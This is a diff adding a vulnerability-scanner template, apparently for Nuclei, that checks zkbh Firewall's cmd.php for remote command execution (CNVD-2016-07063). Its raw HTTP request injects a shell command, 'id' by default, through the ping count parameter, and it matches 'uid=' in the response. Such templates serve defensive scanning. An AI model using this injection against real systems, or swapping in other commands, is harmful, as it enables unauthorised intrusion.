@@ -1,0 +1,30 @@
+id: zkbh-firewall-cmd-php-rce
+info:
+  name: zkbh Firewall cmd.php RCE (CNVD-2016-07063)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    zkbh-Firewall cmd.php has insufficient filtering and is vulnerable to remote command execution.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2016-07063
+  tags: rce
+
+variables:
+  command: "id"
+
+http:
+  - raw:
+      - |
+        GET /diagnostics/cmd.php?action=ping&count=||{{command}}|| HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
